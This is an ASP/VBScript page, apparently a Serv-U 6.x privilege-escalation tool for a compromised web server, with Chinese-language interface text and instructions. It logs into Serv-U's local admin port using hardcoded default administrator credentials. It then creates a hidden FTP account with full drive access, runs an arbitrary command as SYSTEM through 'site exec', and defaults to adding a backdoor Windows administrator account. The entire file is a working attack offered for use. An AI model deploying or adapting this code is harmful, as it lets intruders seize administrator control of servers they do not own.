<%@ LANGUAGE = VBScript %>
<%
Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit
dim action
action=request("action")
if not isnumeric(action) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
 f=left(f,2)
end if
ftpport = ffport
timeout=3

loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=" & iip & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=leaves|" & iip & "|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=luo" & vbCrLf & "-Password=ye" & vbCrLf & _
 "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
 "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
 "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
 "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
 "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
 "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case action
case 1
 set a=Server.CreateObject("Microsoft.XMLHTTP")
 a.open "GET", "http://127.0.0.1:" & port & "/leaves/upadmin/s1",True, "", ""
 a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
 set session("a")=a
%>
<form method="post" name="leaves">
<input name="u" type="hidden" id="u" value="<%=user%>"></td>
<input name="p" type="hidden" id="p" value="<%=pass%>"></td>
<input name="port" type="hidden" id="port" value="<%=port%>"></td>
<input name="c" type="hidden" id="c" value="<%=cmd%>" size="50">
<input name="f" type="hidden" id="f" value="<%=f%>" size="50">
<input name="action" type="hidden" id="action" value="2"></form>
<script language="javascript">
document.write('<center>正在连接 127.0.0.1:<%=port%>,使用用户名: <%=user%>,口令：<%=pass%>...<center>');
setTimeout("document.all.leaves.submit();",4000);
</script>
<%
case 2
 set b=Server.CreateObject("Microsoft.XMLHTTP")
 b.open "GET", "http://127.0.0.1:" & ftpport & "/leaves/upadmin/s2", True, "", ""
 b.send "User luo" & vbCrLf & "pass ye" & vbCrLf & "site exec " & cmd & vbCrLf & quit
 set session("b")=b
%>
<form method="post" name="leaves">
<input name="u" type="hidden" id="u" value="<%=user%>"></td>
<input name="p" type="hidden" id="p" value="<%=pass%>"></td>
<input name="port" type="hidden" id="port" value="<%=port%>"></td>
<input name="c" type="hidden" id="c" value="<%=cmd%>" size="50">
<input name="f" type="hidden" id="f" value="<%=f%>" size="50">
<input name="action" type="hidden" id="action" value="3"></form>
<script language="javascript">
document.write('<center>正在提升权限,请等待...,<center>');
setTimeout("document.all.leaves.submit();",4000);
</script>
<%
case 3
 set c=Server.CreateObject("Microsoft.XMLHTTP")
 c.open "GET", "http://127.0.0.1:" & port & "/leaves/upadmin/s3", True, "", ""
 c.send loginuser & loginpass & mt & deldomain & quit
 set session("c")=c
%>
<center>提权完毕,已执行了命令：
<font color=red><%=cmd%></font>

<input type=button value=" 返回继续 " onClick="location.href='<%=gname()%>';">
</center>

<%
case else
on error resume next
 set a=session("a")
 set b=session("b")
 set c=session("c")
 a.abort
 Set a = Nothing
 b.abort
 Set b = Nothing
 c.abort
 Set c = Nothing
%>
<center><form method="post" name="leaves">
 <tr align="center" valign="middle">
 <td colspan="2">Serv-U 6.X 提权脚本 by 落叶纷飞【S.S.T】 @ 肇庆</td>

 </tr>
 <tr align="center" valign="middle">
 <td width="200">用户名:</td>

 <td width="400"><input name="u" type="text" id="u" value="LocalAdministrator"></td>

 </tr>
 <tr align="center" valign="middle">
 <td>口　令：</td>

 <td><input name="p" type="text" id="p" value="#l@$ak#.lk;0@P"></td>

 </tr>
 <tr align="center" valign="middle">
 <td>端　口：</td>

 <td><input name="port" type="text" id="port" value="43958"></td>

服务器端口：

 <td><input name="ffport" type="text" id="ffport" value="65500"></td>

服务器IP：

 <td><input name="iip" type="text" id="iip" value="0.0.0.0"></td>

 </tr>
 <tr align="center" valign="middle">
 <td>系统路径：</td>

 <td><input name="f" type="text" id="f" value="<%=f%>" size="8"></td>

 </tr>
 <tr align="center" valign="middle">
 <td>命　令：</td>

 <td><input name="c" type="text" id="c" value="cmd /c net user leaves cnsst /add & net localgroup administrators leaves /add" size="50"></td>

 </tr>
 <tr align="center" valign="middle">
 <td colspan="2"><input type="submit" name="Submit" value="提交">
 <input type="reset" name="Submit2" value="重置">
 <input name="action" type="hidden" id="action" value="1"></td>
 </tr>
</form></center>

使用方法：如果是6.4以下的保持默认即可，只要按你的需要修改执行的命令即可！如果为6.4请在“服务器端口”里填21，然后再在“服务器IP”中填写服务器的真实IP。
<% end select
function Gpath()
on error resume next
 err.clear
 set f=Server.CreateObject("Scripting.FileSystemObject")
 if err.number>0 then
gpath="c:"
 exit function
 end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
Function GName()
If request.servervariables("SERVER_PORT")="80" Then
GName="http://" & request.servervariables("server_name")&lcase(request.servervariables("script_name"))
Else
GName="http://" & request.servervariables("server_name")&":"&request.servervariables("SERVER_PORT")&lcase(request.servervariables("script_name"))
End If
End Function
%>